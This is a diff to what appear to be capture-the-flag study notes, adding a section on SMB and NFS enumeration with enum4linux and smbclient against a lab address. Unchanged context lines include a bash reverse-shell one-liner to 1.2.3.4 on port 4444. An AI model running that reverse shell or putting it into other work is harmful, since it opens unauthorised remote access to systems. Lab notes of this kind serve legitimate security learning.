@@ -158,3 +158,19 @@ map -A -T4 10.10.33.224 | tee nmap.txt
 ```
 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
 ```
+
+# Task 12 - Day 10 - Networking
+* Samba
+* SMB - Windows and Linux support
+  * request/response
+  * share
+  * enumeration
+    * enum4linux
+  * access
+    * smbclient
+* NFS - Linux support
+
+```
+enum4linux 10.10.178.30 | tee e4l.txt
+smbclient //10.10.178.30/tbfc-hr
+```
